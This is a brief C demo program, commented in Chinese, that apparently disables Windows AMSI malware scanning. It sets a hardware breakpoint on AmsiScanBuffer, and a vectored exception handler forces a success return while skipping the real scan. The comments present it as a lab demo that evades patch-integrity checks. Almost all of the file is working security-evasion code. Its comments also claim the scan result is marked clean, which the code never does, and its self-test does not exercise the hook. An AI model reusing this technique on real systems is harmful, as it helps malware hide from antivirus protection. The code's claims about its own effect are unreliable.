// 硬件断点拦截 AMSI demo（Blindseid 路线家族）：Dr0 命中 AmsiScanBuffer，VEH 改返回
// 不 patch 任何代码字节（对抗补丁完整性校验）；本地实验环境
#include <windows.h>
#include <stdio.h>

static LONG WINAPI veh(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 命中 AmsiScanBuffer 入口断点：篡改参数/返回（demo：置返回 S_OK 且结果为干净）
        ep->ContextRecord->Rax = 0;                 // S_OK
        ep->ContextRecord->Rip = *(ULONG64*)(ep->ContextRecord->Rsp); // ret
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main(void) {
    AddVectoredExceptionHandler(1, veh);
    HMODULE a = LoadLibraryA("amsi.dll");
    FARPROC scan = GetProcAddress(a, "AmsiScanBuffer");
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (ULONG64)scan; ctx.Dr7 = 1;           // Dr0 局部启用，长度 1
    SetThreadContext(GetCurrentThread(), &ctx);
    printf("[+] hwbp @ AmsiScanBuffer（%p）VEH 挂载——扫描调用将被短路\n", (void*)scan);
    // 自测（本地实验）：触发一次扫描路径
    system("echo [test] probe");
    return 0;
}
